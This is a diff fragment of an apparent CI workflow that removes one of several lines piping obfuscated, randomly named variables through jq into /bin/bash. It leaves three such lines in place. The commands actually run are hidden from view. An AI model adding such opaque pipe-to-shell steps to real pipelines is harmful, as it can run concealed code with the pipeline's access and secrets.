@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$rktnm8234" | jq -r .az52 | /bin/bash
           printf '%s' "$iiz786" | jq -r .tu71 | /bin/bash
           printf '%s' "$ocn442" | jq -r .d011 | /bin/bash
-          printf '%s' "$w96" | jq -r .kz1 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
